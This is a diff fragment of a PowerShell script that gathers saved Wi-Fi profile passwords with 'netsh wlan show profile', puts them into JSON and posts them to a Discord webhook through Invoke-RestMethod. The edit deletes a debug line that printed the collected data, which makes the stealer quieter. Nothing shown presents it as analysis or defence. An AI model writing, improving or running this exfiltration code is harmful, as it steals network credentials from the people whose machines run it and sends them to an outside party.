@@ -37,7 +37,6 @@ netsh wlan show profile | Select-String $userProfileString | ForEach-Object {
         'content' = [string]$passw
     }
 $JsonBody = ($Body | ConvertTo-Json -Compress)
-Write-Host "$JsonBody"
 # Remove the comments if you want debug it
     try {
     Invoke-RestMethod -ContentType 'Application/Json' -Uri $discord -Method Post -Body $JsonBody
